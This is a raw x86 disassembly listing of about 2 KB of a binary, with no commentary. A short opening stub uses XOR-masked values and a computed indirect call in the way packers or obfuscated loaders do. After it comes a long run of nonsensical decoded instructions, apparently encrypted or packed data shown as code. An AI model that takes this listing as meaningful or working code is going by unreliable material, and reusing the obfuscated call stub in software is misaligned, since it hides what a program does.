  4119f8:	jmp    0x411a02
  4119fd:	mov    ebx,0x32729c
  411a02:	mov    eax,DWORD PTR [ebp-0x4]
  411a05:	xor    eax,0x7510855
  411a0a:	add    eax,ebx
  411a0c:	mov    DWORD PTR [ebp-0xc],eax
  411a0f:	xor    ebx,ebx
  411a11:	lea    eax,[ebp-0x10]
  411a14:	add    ebx,DWORD PTR [eax]
  411a16:	call   ebx
  411a18:	xor    ebx,ebx
  411a1a:	inc    ebx
  411a1b:	cmp    DWORD PTR [ebp+0x10],ebx
  411a1e:	je     0x411e30
  411a24:	xchg   edx,eax
  411a25:	push   0xa
  411a27:	pop    ecx
  411a28:	push   0x4
  411a2a:	pop    ebx
  411a2b:	inc    ebx
  411a2c:	jmp    0x411e20
  411a31:	inc    ebp
  411a32:	or     DWORD PTR [edi+0x55d349c7],0xffffff81
  411a39:	push   esi
  411a3a:	ds sbb eax,0xc3d3257d
  411a40:	pop    edx
  411a41:	(bad)  
  411a42:	dec    esp
  411a43:	jo     0x411ab5
  411a45:	dec    ecx
  411a46:	jge    0x411ab8
  411a48:	jo     0x411a3b
  411a4a:	push   eax
  411a4b:	sub    ch,dh
  411a4d:	fistp  WORD PTR [ebx-0x3e]
  411a50:	xor    edx,ebx
  411a52:	nop
  411a53:	dec    ebx
  411a54:	adc    DWORD PTR ds:0xd1b6d902,esi
  411a5a:	(bad)  
  411a5c:	mov    ah,0x80
  411a5e:	sbb    eax,0xdd0eb01a
  411a63:	adc    bh,0x24
  411a66:	mov    esi,0x783a1ac6
  411a6b:	fistp  QWORD PTR [edx-0x39]
  411a6e:	inc    eax
  411a6f:	jmp    0x565b:0xac3e58d3
  411a76:	dec    DWORD PTR [ebp+ebp*8-0x11]
  411a7a:	in     al,dx
  411a7b:	push   esi
  411a7c:	test   al,0x2
  411a7e:	jns    0x411a04
  411a80:	neg    DWORD PTR [eax+0x7b]
  411a83:	mov    WORD PTR [edi],gs
  411a85:	sbb    BYTE PTR [esi],dh
  411a87:	pop    DWORD PTR [ebx-0x40]
  411a8a:	xchg   DWORD PTR [eax],ecx
  411a8c:	jl     0x411a62
  411a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a8f:	mov    esi,DWORD PTR [edi-0x7c7a0ec]
  411a95:	and    esi,edi
  411a97:	int    0x16
  411a99:	and    esp,DWORD PTR [edx-0x67]
  411a9c:	inc    ebx
  411a9d:	ja     0x411ae8
  411a9f:	out    dx,al
  411aa0:	push   ss
  411aa1:	cmc    
  411aa2:	popf   
  411aa3:	mov    eax,0xfbccca41
  411aa8:	adc    dl,BYTE PTR [ecx+0x14299515]
  411aae:	pop    DWORD PTR [ebp-0x1316a458]
  411ab4:	sbb    dl,dh
  411ab6:	add    DWORD PTR [edi],ebx
  411ab8:	xchg   esi,eax
  411ab9:	sbb    cl,bl
  411abb:	out    dx,eax
  411abc:	mov    edx,0x1c5a0a89
  411ac1:	sub    eax,0x41a60673
  411ac6:	sbb    eax,0xe7ca0587
  411acb:	lods   al,BYTE PTR ds:[esi]
  411acc:	inc    edi
  411acd:	sti    
  411ace:	imul   DWORD PTR [edi]
  411ad0:	aad    0x1c
  411ad2:	push   esi
  411ad3:	arpl   WORD PTR [edx+0x1c0cc040],dx
  411ad9:	arpl   WORD PTR [esi+0x69],ax
  411adc:	push   esp
  411add:	repz lahf 
  411adf:	lock nop
  411ae1:	cmc    
  411ae2:	mov    esp,0x33c5b626
  411ae7:	push   es
  411ae8:	mov    cl,0xc2
  411aea:	mov    edx,0xde63804d
  411aef:	and    dh,dl
  411af1:	inc    edi
  411af2:	add    BYTE PTR [ebx],0xf9
  411af5:	add    BYTE PTR [eax+0x2b],dl
  411af8:	xor    al,0x2
  411afa:	and    dl,BYTE PTR [eax+0x467acbe8]
  411b00:	loopne 0x411b45
  411b02:	adc    esi,DWORD PTR [edi-0x5b]
  411b05:	mov    BYTE PTR [esi+0x55],bl
  411b08:	mov    ah,0x1b
  411b0a:	jne    0x411a9c
  411b0c:	add    DWORD PTR [esi-0x66613f9f],esp
  411b12:	inc    edi
  411b13:	cmp    eax,0xc092eae
  411b18:	jmp    0xff29:0x94272658
  411b1f:	out    dx,eax
  411b20:	shr    ebx,1
  411b22:	adc    al,0x37
  411b24:	mov    BYTE PTR [ecx],ah
  411b26:	jno    0x411b89
  411b28:	leave  
  411b29:	test   al,0xbe
  411b2b:	add    BYTE PTR [edx],bl
  411b2d:	in     eax,0x4e
  411b2f:	stc    
  411b30:	inc    edi
  411b31:	das    
  411b32:	or     eax,0xb9df46cb
  411b37:	stos   DWORD PTR es:[edi],eax
  411b38:	gs pop ds
  411b3a:	push   ds
  411b3b:	dec    ecx
  411b3c:	mov    dl,0x8f
  411b3e:	xchg   ebx,eax
  411b3f:	sub    bl,BYTE PTR [eax]
  411b41:	mov    ch,0xf
  411b43:	test   eax,0x2b292c37
  411b48:	call   0xf7b9:0xfe5dfbd5
  411b4f:	hlt    
  411b50:	jge    0x411b93
  411b52:	inc    ebp
  411b53:	out    dx,al
  411b54:	xor    BYTE PTR ds:0x6a4c0736,ah
  411b5a:	add    al,0x3b
  411b5c:	je     0x411b33
  411b5e:	cs xchg esp,eax
  411b60:	jno    0x411bd5
  411b62:	pop    edi
  411b63:	push   0x5
  411b65:	sbb    eax,ecx
  411b67:	mov    eax,0x121b8142
  411b6c:	sub    eax,0x75242879
  411b71:	jns    0x411bc8
  411b73:	js     0x411bd9
  411b75:	xchg   ebp,eax
  411b76:	mov    esp,DWORD PTR [ebp+0x48400158]
  411b7c:	loope  0x411b32
  411b7e:	test   al,0x6b
  411b80:	test   eax,0x1de11539
  411b85:	pop    esp
  411b86:	push   ebx
  411b87:	mov    ebp,edi
  411b89:	call   0x958f6e3e
  411b8e:	dec    ebp
  411b8f:	test   DWORD PTR [esi],ebx
  411b91:	dec    ebp
  411b92:	jmp    0x3e87:0xedeb88d3
  411b99:	and    cl,BYTE PTR [esi+esi*2+0x77a4f6a4]
  411ba0:	sbb    ecx,0x4c50fc9d
  411ba6:	adc    ah,BYTE PTR [eax-0xa17a6af]
  411bac:	adc    esp,edi
  411bae:	loopne 0x411bae
  411bb0:	push   ebp
  411bb1:	dec    esp
  411bb2:	repnz and dl,al
  411bb5:	pop    edx
  411bb6:	cmp    dh,bl
  411bb8:	adc    al,0xb6
  411bba:	xlat   BYTE PTR ds:[ebx]
  411bbb:	sti    
  411bbc:	add    eax,0xf21e1c80
  411bc1:	fs stos BYTE PTR es:[edi],al
  411bc3:	sbb    dh,0x4b
  411bc6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bc8:	sar    cl,0x20
  411bcb:	int    0x93
  411bcd:	rcr    BYTE PTR [ebp+ebp*1-0x37],cl
  411bd1:	es daa 
  411bd3:	or     al,0xfb
  411bd5:	push   es
  411bd6:	mov    edx,0x78dab11
  411bdb:	(bad)  
  411bdc:	aas    
  411bdd:	mov    WORD PTR [eax+0x38],ds
  411be0:	jo     0x411c49
  411be2:	shr    BYTE PTR [ecx+0x59],cl
  411be5:	out    0xf,al
  411be7:	sub    DWORD PTR [eax],ebx
  411be9:	fild   QWORD PTR [esi]
  411beb:	cmp    bl,BYTE PTR [esi+edi*8]
  411bee:	mov    esp,0x4d093b1f
  411bf3:	adc    DWORD PTR [ebx+0x73590210],esp
  411bf9:	(bad)  
  411bfa:	out    dx,eax
  411bfb:	mov    esi,0x177ebe9f
  411c00:	fnstcw WORD PTR [edx+0x5e]
  411c03:	pop    ebx
  411c04:	pop    esi
  411c05:	mov    ah,0x7f
  411c07:	cli    
  411c08:	sti    
  411c09:	pop    edi
  411c0a:	mov    ch,0x79
  411c0c:	mov    dh,0x14
  411c0e:	mov    esp,0x8e152632
  411c13:	push   0x51
  411c15:	les    esi,FWORD PTR [edx-0x6d94d555]
  411c1b:	and    al,0x63
  411c1d:	test   eax,0xb94d7f89
  411c22:	push   es
  411c23:	push   ds
  411c24:	test   ebx,ebx
  411c26:	fcmovu st,st(2)
  411c28:	push   es
  411c29:	sbb    DWORD PTR [ebp-0x49],ebx
  411c2c:	xor    edx,DWORD PTR [edi+ecx*8-0x78a1a889]
  411c33:	dec    eax
  411c34:	les    esp,FWORD PTR [esp+esi*1+0x59]
  411c38:	sbb    al,0xf6
  411c3a:	or     esp,DWORD PTR [edi+esi*4]
  411c3d:	mov    al,ds:0xc644a3f5
  411c42:	loopne 0x411bf4
  411c44:	sub    eax,0x23f8d017
  411c49:	(bad)  
  411c4b:	push   es
  411c4c:	lds    edx,FWORD PTR [eax]
  411c4e:	fsubr  DWORD PTR [edi-0x54b37746]
  411c54:	push   0x2f
  411c56:	sub    al,0x1b
  411c58:	lock jmp 0x411c4e
  411c5b:	jb     0x411c18
  411c5d:	cmc    
  411c5e:	lods   eax,DWORD PTR ds:[esi]
  411c5f:	cmp    BYTE PTR [ebp+edi*8-0x41114377],cl
  411c66:	mov    ah,0xff
  411c68:	jmp    0xec7c281f
  411c6d:	mov    al,ds:0x2a1a363b
  411c72:	icebp  
  411c73:	adc    DWORD PTR [edx-0x34],eax
  411c76:	cli    
  411c77:	adc    eax,0x2a18b1fa
  411c7c:	nop
  411c7d:	arpl   WORD PTR [esp+esi*2-0x51],bp
  411c81:	pop    edi
  411c82:	xchg   edx,eax
  411c83:	inc    ebx
  411c84:	sahf   
  411c85:	cmp    ecx,DWORD PTR [edx-0x43a1e9b2]
  411c8b:	lock or BYTE PTR [edx-0x155733e3],ch
  411c92:	mov    esp,ds
  411c94:	push   ebx
  411c95:	jns    0x411cda
  411c97:	aam    0xd
  411c99:	pop    ecx
  411c9a:	pop    edi
  411c9b:	xchg   DWORD PTR [eax],ecx
  411c9d:	in     eax,0xa6
  411c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ca0:	cwde   
  411ca1:	xchg   esp,eax
  411ca2:	retf   0xc0b1
  411ca5:	cmp    BYTE PTR [esi-0x3bfcfcd5],dl
  411cab:	cmp    edi,DWORD PTR [ebp-0x13ca68f0]
  411cb1:	push   esi
  411cb2:	mov    edi,0x255ded6a
  411cb7:	or     DWORD PTR [eax+0x7b],ecx
  411cba:	adc    DWORD PTR [edx+0x16],edx
  411cbd:	sub    BYTE PTR [edi],bh
  411cbf:	sti    
  411cc0:	cmp    edx,DWORD PTR [ecx]
  411cc2:	mov    ecx,0x8b962d77
  411cc7:	adc    edi,DWORD PTR [ebp-0x3274122d]
  411ccd:	mov    DWORD PTR [ecx+0x5cc8ebba],edi
  411cd3:	jnp    0x411d10
  411cd5:	call   DWORD PTR [ebp+0x61]
  411cd8:	dec    esp
  411cd9:	aad    0x65
  411cdb:	int    0x85
  411cdd:	pop    ds
  411cde:	icebp  
  411cdf:	push   ds
  411ce0:	and    eax,0x8157b3ce
  411ce5:	ja     0x411cd4
  411ce7:	cld    
  411ce8:	dec    ebx
  411ce9:	add    ebx,DWORD PTR [ebp+0x3f]
  411cec:	jge    0x411d3f
  411cee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cef:	cs loop 0x411d70
  411cf2:	dec    esi
  411cf3:	cmc    
  411cf4:	sti    
  411cf5:	mov    ds:0x96010f26,al
  411cfa:	sub    cl,BYTE PTR [eax-0x9]
  411cfd:	fldenv [edx-0x45]
  411d00:	js     0x411cc5
  411d02:	xchg   ebx,eax
  411d03:	add    bl,BYTE PTR [edx-0x46]
  411d06:	nop
  411d07:	addr16 xchg ecx,eax
  411d09:	mov    ds:0x12fdda50,al
  411d0e:	mov    bl,0x5
  411d10:	out    dx,eax
  411d11:	mov    dh,0x15
  411d13:	mov    bl,0x67
  411d15:	mov    ds:0x1ad921ca,al
  411d1a:	gs pop esi
  411d1c:	test   eax,0xd361fc89
  411d21:	pop    edi
  411d22:	mov    ds:0x5d21e536,eax
  411d27:	adc    ah,BYTE PTR [eax]
  411d29:	add    BYTE PTR ds:0xcc00d134,dh
  411d2f:	jne    0x411d2a
  411d31:	pop    ecx
  411d32:	ficomp DWORD PTR [esi+0xc34825e]
  411d38:	es pusha 
  411d3a:	lods   al,BYTE PTR ds:[esi]
  411d3b:	xchg   ecx,eax
  411d3c:	xor    DWORD PTR [ebp+0x37d971cb],eax
  411d42:	jne    0x411d73
  411d44:	mov    DWORD PTR [edx+0x366dccde],edi
  411d4a:	ja     0x411d3f
  411d4c:	pop    esi
  411d4d:	cmp    bl,BYTE PTR [eax]
  411d4f:	mov    eax,0x2a4e62ee
  411d54:	(bad)  
  411d55:	call   0x38ff:0x103cf8c6
  411d5c:	into   
  411d5d:	ins    DWORD PTR es:[edi],dx
  411d5e:	clc    
  411d5f:	out    0x5b,eax
  411d61:	stos   DWORD PTR es:[edi],eax
  411d62:	and    eax,DWORD PTR [ecx]
  411d64:	js     0x411dc5
  411d66:	mov    ebp,0x31969569
  411d6b:	push   edx
  411d6c:	pop    edx
  411d6d:	test   eax,0x4d0f24e1
  411d72:	aaa    
  411d73:	push   0xffffffe7
  411d75:	fld    QWORD PTR [eax]
  411d77:	cld    
  411d78:	fistp  QWORD PTR [edx]
  411d7a:	dec    ecx
  411d7b:	add    al,0x6
  411d7d:	mov    eax,0x18e75544
  411d82:	mov    DWORD PTR [ecx+0x45],ebp
  411d85:	aaa    
  411d86:	lea    esp,[edi+ebp*4]
  411d89:	and    BYTE PTR [edx-0x5f9f459f],ah
  411d8f:	out    0xa4,eax
  411d91:	pop    eax
  411d92:	fs retf 
  411d94:	jmp    0x411d27
  411d96:	iret   
  411d97:	in     al,dx
  411d98:	outs   dx,BYTE PTR ds:[esi]
  411d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d9a:	mov    eax,0xa3cbbd96
  411d9f:	dec    ebx
  411da0:	imul   DWORD PTR [edi-0x73]
  411da3:	(bad)  
  411da4:	jmp    0x411e1c
  411da6:	inc    eax
  411da7:	stos   DWORD PTR es:[edi],eax
  411da8:	aam    0x26
  411daa:	dec    esp
  411dab:	test   al,0xd9
  411dad:	aaa    
  411dae:	gs mov ch,0x2d
  411db1:	mov    WORD PTR [edi+0x10],?
  411db4:	or     BYTE PTR [edi-0x43],dl
  411db7:	cmp    ebx,DWORD PTR [eax-0x68]
  411dba:	imul   edi,DWORD PTR [edx+0x50],0x1b
  411dbe:	pop    ss
  411dbf:	out    0x6a,eax
  411dc1:	pop    esi
  411dc2:	xor    al,0xec
  411dc4:	cli    
  411dc5:	jmp    0x6ba000a2
  411dca:	idiv   dh
  411dcc:	dec    ecx
  411dcd:	mov    ds:0xe17e814b,eax
  411dd2:	cmp    BYTE PTR [eax-0x77df9ff0],ah
  411dd8:	in     al,dx
  411dd9:	mov    ebp,0x94383fe9
  411dde:	mov    WORD PTR [esi+0x340bcb71],?
  411de4:	addr16 enter 0x65e2,0x86
  411de9:	sahf   
  411dea:	inc    esp
  411deb:	rcr    DWORD PTR [esp+edx*8-0x59],1
  411def:	pop    ebx
  411df0:	sub    ah,dh
  411df2:	cmp    eax,0xec8fb564
  411df7:	fisttp WORD PTR [eax]
  411df9:	mov    eax,0xc0de1013
  411dfe:	dec    ebx
  411dff:	fucomp st(3)
  411e01:	add    edi,DWORD PTR [esi]
  411e03:	push   esi
  411e04:	frstor [esi+0x686e9c32]
  411e0a:	ss (bad) 
  411e0c:	jmp    0x28f0418
  411e11:	adc    al,0x5e
  411e13:	aad    0x46
  411e15:	mov    al,0xaf
  411e17:	push   edx
  411e18:	inc    edx
  411e19:	call   0x3c3c:0x4469ea1d
  411e20:	xchg   ebx,ecx
  411e22:	sub    ebx,ecx
  411e24:	xchg   ebx,ecx
  411e26:	dec    ecx
  411e27:	mov    eax,DWORD PTR [ebp-0x1c]
  411e2a:	imul   eax,ecx
  411e2d:	add    esp,eax
  411e2f:	xchg   edx,eax
  411e30:	push   eax
  411e31:	xor    ebx,ebx
  411e33:	mov    edx,esp
  411e35:	dec    edx
  411e36:	inc    ebx
  411e37:	add    ebx,DWORD PTR [edx+ebx*1]
  411e3a:	jmp    0x41222e
  411e3f:	jp     0x411dc5
  411e41:	jb     0x411ea0
  411e43:	jb     0x411eb2
  411e45:	adc    DWORD PTR [ebx-0xc],esp
  411e48:	sub    ebp,DWORD PTR [esi]
  411e4a:	cmc    
  411e4b:	xlat   BYTE PTR ds:[ebx]
  411e4c:	enter  0x60af,0x10
  411e50:	dec    eax
  411e51:	jo     0x411ec3
  411e53:	dec    ecx
  411e54:	jge    0x411ec6
  411e56:	jo     0x411e21
  411e58:	xor    DWORD PTR [ebp-0x46],eax
  411e5b:	pop    ds
  411e5c:	out    dx,al
  411e5d:	push   eax
  411e5e:	fld    TBYTE PTR [edx+eiz*8-0x2fcc88ad]
  411e65:	adc    al,0xbd
  411e67:	cli    
  411e68:	ror    esp,cl
  411e6a:	pop    ss
  411e6b:	xor    DWORD PTR [ecx-0x30520841],ecx
  411e71:	aaa    
  411e72:	loope  0x411e3d
  411e74:	es push ebp
  411e76:	mov    ecx,0x571f6556
  411e7b:	test   eax,0x5921cbb4
  411e80:	aad    0xfb
  411e82:	mov    al,0xa1
  411e84:	or     DWORD PTR [edx-0x11],edi
  411e87:	(bad)  
  411e89:	arpl   WORD PTR [edi-0x57adf921],bp
  411e8f:	mov    BYTE PTR [edi-0x3e9df2e6],bl
  411e95:	lods   al,BYTE PTR ds:[esi]
  411e96:	(bad)  
  411e97:	xchg   esp,eax
  411e98:	push   edx
  411e99:	adc    ch,BYTE PTR [ecx]
  411e9b:	adc    BYTE PTR [ebx-0x18],ch
  411e9e:	mov    BYTE PTR [ebx],cl
  411ea0:	xchg   DWORD PTR [esi],esp
  411ea2:	sub    edi,DWORD PTR [esi]
  411ea4:	add    esi,DWORD PTR [edx]
  411ea6:	lods   eax,DWORD PTR ds:[esi]
  411ea7:	daa    
  411ea8:	cmp    BYTE PTR ds:0x6d4a8870,dh
  411eae:	data16 sahf 
  411eb0:	fsub   DWORD PTR [ebp+0x55736bfa]
  411eb6:	mov    bl,0xff
  411eb8:	sbb    al,0x2a
  411eba:	sbb    eax,0x56aad7c9
  411ebf:	sub    eax,ecx
  411ec1:	imul   eax,ebx,0xffffffc6
  411ec4:	(bad)  
  411ec5:	pop    ebx
  411ec6:	std    
  411ec7:	sub    edi,esi
  411ec9:	and    DWORD PTR [edx+edx*2+0x7],edi
  411ecd:	adc    DWORD PTR [eax+0x22a80482],esp
  411ed3:	cmp    eax,0xea4616af
  411ed8:	adc    ch,0xb3
  411edb:	adc    cl,dh
  411edd:	sahf   
  411ede:	sub    DWORD PTR [edx+0x78],esp
  411ee1:	sub    cl,BYTE PTR [edx]
  411ee3:	sbb    bh,dl
  411ee5:	test   BYTE PTR [edx+ebx*4],dl
  411ee8:	retf   
  411ee9:	sbb    al,BYTE PTR ds:0x27be5067
  411eef:	and    eax,eax
  411ef1:	sbb    eax,0x28b6e27d
  411ef6:	xor    al,0x29
  411ef8:	lock xor DWORD PTR [esi-0x41],0xffffffa1
  411efd:	lahf   
  411efe:	sbb    BYTE PTR ds:0x933a134d,bh
  411f04:	inc    eax
  411f05:	mov    dh,0x1
  411f07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f08:	jmp    0x41cf34ef
  411f0d:	sar    bl,0x75
  411f10:	pop    edi
  411f11:	or     al,0xef
  411f13:	xchg   esi,eax
  411f14:	outs   dx,BYTE PTR ds:[esi]
  411f15:	pop    esp
  411f16:	ins    BYTE PTR es:[edi],dx
  411f17:	outs   dx,BYTE PTR ds:[esi]
  411f18:	mov    ds:0xe2a2a959,al
  411f1d:	ins    DWORD PTR es:[edi],dx
  411f1e:	cmc    
  411f1f:	dec    ebx
  411f20:	jmp    0xf7e2f8d0
  411f25:	int    0x32
  411f27:	js     0x411ede
  411f29:	and    esp,esp
  411f2b:	nop
  411f2c:	iret   
  411f2d:	enter  0x9aee,0xa
  411f31:	(bad)  
  411f32:	das    
  411f33:	add    cl,0xf2
  411f36:	jns    0x411fa2
  411f38:	push   edi
  411f39:	rol    eax,cl
  411f3b:	into   
  411f3c:	sub    BYTE PTR [ebx+eiz*4-0x3f],0x68
  411f41:	mov    bl,0xac
  411f43:	pop    edx
  411f44:	pop    edx
  411f45:	arpl   WORD PTR [ebx-0x2685f8d],bp
  411f4b:	mov    dh,0x98
  411f4d:	mov    al,0x37
  411f4f:	shr    BYTE PTR [esi-0x7a],1
  411f52:	rcl    DWORD PTR [ebp+0x6fd47cef],1
  411f58:	pop    ebp
  411f59:	pop    ebp
  411f5a:	inc    eax
  411f5b:	std    
  411f5c:	iret   
  411f5d:	push   esp
  411f5e:	loope  0x411f30
  411f60:	in     al,0x7a
  411f62:	frstor [edi]
  411f64:	or     al,0x2c
  411f66:	xchg   DWORD PTR [edi+0x4fb5bec5],eax
  411f6c:	(bad)  
  411f6d:	(bad)  
  411f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f6f:	enter  0xacb,0xce
  411f73:	mov    ecx,eax
  411f75:	fcmovne st,st(2)
  411f77:	test   BYTE PTR [ecx],dh
  411f79:	enter  0xf80e,0xd7
  411f7d:	icebp  
  411f7e:	or     DWORD PTR [ebp-0x7d],0xff69d557
  411f85:	sub    eax,0x2421af46
  411f8a:	(bad)  
  411f8b:	iret   
  411f8c:	aas    
  411f8d:	dec    ecx
  411f8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f8f:	fcmovnb st,st(1)
  411f91:	mov    ecx,DWORD PTR [ecx]
  411f93:	fwait
  411f94:	xor    ebp,DWORD PTR [ebx]
  411f96:	sbb    bl,dh
  411f98:	add    al,0x78
  411f9a:	pop    ecx
  411f9b:	daa    
  411f9c:	retf   
  411f9d:	(bad)  
  411f9f:	mov    al,ds:0x1c49f0b5
  411fa4:	(bad)  
  411fa5:	outs   dx,DWORD PTR ds:[esi]
  411fa6:	and    dh,BYTE PTR [ecx]
  411fa8:	mov    BYTE PTR [esi-0x5d],bl
  411fab:	xchg   ebp,eax
  411fac:	pushf  
  411fad:	cli    
  411fae:	jl     0x412013
  411fb0:	popa   
  411fb1:	dec    ecx
  411fb2:	cmp    al,0xa9
  411fb4:	call   0x6f95bbb9
  411fb9:	add    eax,0xf3c63e9b
  411fbe:	ins    DWORD PTR es:[edi],dx
  411fbf:	mov    esi,0x5e8682a
  411fc4:	add    esp,DWORD PTR [edx+esi*2]
  411fc7:	aaa    
  411fc8:	loope  0x411fc0
  411fca:	mov    esi,0x2ba01280
  411fcf:	push   ebp
  411fd0:	neg    DWORD PTR [esi+0x7331bbc9]
  411fd6:	pop    ds
  411fd7:	mov    edx,0x9dbbab79
  411fdc:	pop    esp
  411fdd:	mov    al,ds:0xefa4a6e4
  411fe2:	(bad)  
  411fe3:	or     bl,BYTE PTR [esi]
  411fe5:	lods   eax,DWORD PTR ds:[esi]
  411fe6:	jo     0x41203c
  411fe8:	je     0x412064
  411fea:	mov    dl,0x18
  411fec:	mov    BYTE PTR [ecx],ch
  411fee:	jecxz  0x41203d
  411ff0:	inc    edi
  411ff1:	xchg   ecx,eax
  411ff2:	push   ds
  411ff3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  411ff5:	fmul   QWORD PTR [esi+edx*4-0x19d2b926]
  411ffc:	xchg   esp,edx
  411ffe:	mov    ebp,0x591da7ff
  412003:	mov    dl,0xff
  412005:	push   esi
  412006:	cmp    BYTE PTR [edi],ah
  412008:	lahf   
  412009:	xor    BYTE PTR cs:[esi-0x66],dh
  41200d:	imul   esi,DWORD PTR [esi+0x5518025],0xb9f503c8
  412017:	dec    eax
  412018:	jmp    0x412062
  41201a:	leave  
  41201b:	xlat   BYTE PTR ds:[ebx]
  41201c:	js     0x412054
  41201e:	jmp    0x411fc1
  412020:	sbb    DWORD PTR [ecx-0x610b0b2f],ebp
  412026:	into   
  412027:	cwde   
  412028:	pop    ebp
  412029:	inc    ecx
  41202a:	xor    BYTE PTR [eax+0x3b],ah
  41202d:	retf   0xf765
  412030:	jmp    0x9ced1591
  412035:	out    0x18,eax
  412037:	xchg   esi,eax
  412038:	mov    ebx,0xfac73301
  41203d:	push   edx
  41203e:	and    DWORD PTR [ebx],esp
  412040:	pop    ecx
  412041:	jnp    0x411fea
  412043:	mov    WORD PTR [ebp-0x3c],es
  412046:	(bad)  
  412047:	iret   
  412048:	pop    ebx
  412049:	out    0xd8,eax
  41204b:	js     0x412098
  41204d:	fidiv  WORD PTR [ebp+0x7]
  412050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412051:	shl    BYTE PTR [ebx-0x3895e530],cl
  412057:	cmc    
  412058:	iret   
  412059:	mov    ebx,0x336e3208
  41205e:	shr    DWORD PTR ds:0xe7f6eac3,0xaa
  412065:	lods   al,BYTE PTR ds:[esi]
  412066:	sub    eax,0x87869c73
  41206b:	inc    ecx
  41206c:	push   0x59
  41206e:	adc    BYTE PTR [ecx-0x4c026858],0xb4
  412075:	shl    ch,0x28
  412078:	adc    al,0x5d
  41207a:	fistp  QWORD PTR [edx+0x37]
  41207d:	push   eax
  41207e:	jb     0x4120f7
  412080:	(bad)  
  412081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412082:	add    al,0x14
  412084:	mov    dl,BYTE PTR [edi-0x74]
  412087:	mov    ds:0x13862bc1,eax
  41208c:	inc    ebp
  41208d:	mov    bh,0x8
  41208f:	imul   ecx,DWORD PTR [esi-0x2083dca6],0xf80ad542
  412099:	pusha  
  41209a:	rol    DWORD PTR [ecx],1
  41209c:	aad    0x94
  41209e:	and    ebp,DWORD PTR [ebx-0x33494ee8]
  4120a4:	or     ch,bh
  4120a6:	int3   
  4120a7:	stos   BYTE PTR es:[edi],al
  4120a8:	hlt    
  4120a9:	and    edx,0x29
  4120ac:	adc    eax,0x87abbd29
  4120b1:	sbb    eax,0x44785d76
  4120b6:	out    dx,al
  4120b7:	push   ecx
  4120b8:	mov    ch,0x9e
  4120ba:	dec    edi
  4120bb:	mov    DWORD PTR [eax-0x13],esp
  4120be:	gs cld 
  4120c0:	call   0x2b40:0xb64fc342
  4120c7:	xchg   edx,eax
  4120c8:	pop    ss
  4120c9:	jae    0x41209f
  4120cb:	mov    ch,0x1
  4120cd:	jne    0x412147
  4120cf:	push   es
  4120d0:	addr16 enter 0x3498,0xa8
  4120d5:	xor    al,0x2d
  4120d7:	pop    ebx
  4120d8:	push   eax
  4120d9:	or     ecx,ebp
  4120db:	cmp    DWORD PTR [ecx],ebx
  4120dd:	and    eax,DWORD PTR [ebx]
  4120df:	xor    bh,BYTE PTR [eax]
  4120e1:	test   eax,0x554ab9f1
  4120e6:	aad    0xba
  4120e8:	enter  0x3b72,0xd3
  4120ec:	xor    edi,DWORD PTR [ebx-0x6b]
  4120ef:	xor    esp,edx
  4120f1:	push   cs
  4120f2:	cmp    DWORD PTR [edi+edx*4-0x55ddf7e7],esp
  4120f9:	xchg   ebx,eax
  4120fa:	into   
  4120fb:	fiadd  WORD PTR [eax+edi*2-0x71]
  4120ff:	push   esi
  412100:	aad    0x7
  412102:	jb     0x4120fb
  412104:	jmp    0xdbfc:0x362b8dec
  41210b:	push   esi
  41210c:	das    
  41210d:	xor    BYTE PTR [eax+eiz*8-0x667e7c08],ah
  412114:	push   cs
  412115:	cmp    eax,0x45baefdb
  41211a:	jae    0x412131
  41211c:	das    
  41211d:	jecxz  0x4120ee
  41211f:	mov    ds:0x98abd3bf,al
  412124:	dec    ecx
  412125:	xor    dh,BYTE PTR [ebp+0x63]
  412128:	inc    BYTE PTR [eax]
  41212a:	and    dh,BYTE PTR [ebx]
  41212c:	sbb    eax,0x2a97a1de
  412131:	push   edx
  412132:	mov    al,0x64
  412134:	nop
  412135:	std    
  412136:	xor    eax,0xc452a985
  41213b:	loope  0x41216c
  41213d:	xchg   ebp,eax
  41213e:	mov    ch,0xf1
  412140:	cmp    al,cl
  412142:	or     BYTE PTR [ebx-0x4eb6946f],bh
  412148:	loopne 0x4121ad
  41214a:	dec    ebp
  41214b:	inc    ecx
  41214c:	(bad)  
  41214d:	jnp    0x41210c
  41214f:	cmp    bl,BYTE PTR [eax+0x1e]
  412152:	sub    eax,0xcb7024d5
  412157:	aad    0xd8
  412159:	push   esi
  41215a:	fmul   DWORD PTR [esi+0x62]
  41215d:	mov    eax,ds:0xcd7b486e
  412162:	adc    edx,edx
  412164:	int3   
  412165:	addr16 cmp ecx,0xb3af351
  41216c:	rcpps  xmm7,xmm7
  41216f:	pop    edi
  412170:	out    dx,al
  412171:	(bad)  
  412172:	bound  edi,QWORD PTR [edx-0xa0f3c2b]
  412178:	enter  0xef31,0xc0
  41217c:	jmp    0xadb7e8c5
  412181:	sub    edx,ebx
  412183:	push   0xdac47fb5
  412188:	cld    
  412189:	pushf  
  41218a:	mov    cl,0xd9
  41218c:	and    eax,0x4a574aab
  412191:	or     BYTE PTR [esi-0x15],bl
  412194:	repnz lods al,BYTE PTR ds:[esi]
  412196:	or     DWORD PTR ds:0xdfeb2509,ecx
  41219c:	push   eax
  41219d:	or     DWORD PTR [ebx+0x6a],0xffffffbe
  4121a1:	daa    
  4121a2:	pop    edi
  4121a3:	lock loope 0x4121a4
  4121a6:	iret   
  4121a7:	cmp    al,0x9f
  4121aa:	mov    dh,0xae
  4121ac:	sub    DWORD PTR [edx+ecx*4],ebx
  4121af:	sbb    cl,0x51
  4121b2:	mov    BYTE PTR [edx+edx*2-0x10],cl
  4121b6:	call   0xcb74617c
  4121bb:	ret    0x2c11
  4121be:	sbb    al,0xa0
  4121c0:	fbld   TBYTE PTR ds:0xd237dcab
  4121c6:	adc    edi,edx
  4121c8:	stc    
  4121c9:	xchg   esi,eax
  4121ca:	and    DWORD PTR [eax-0x4d],edi
  4121cd:	icebp  
  4121ce:	test   DWORD PTR [ecx+0x768d29de],ecx
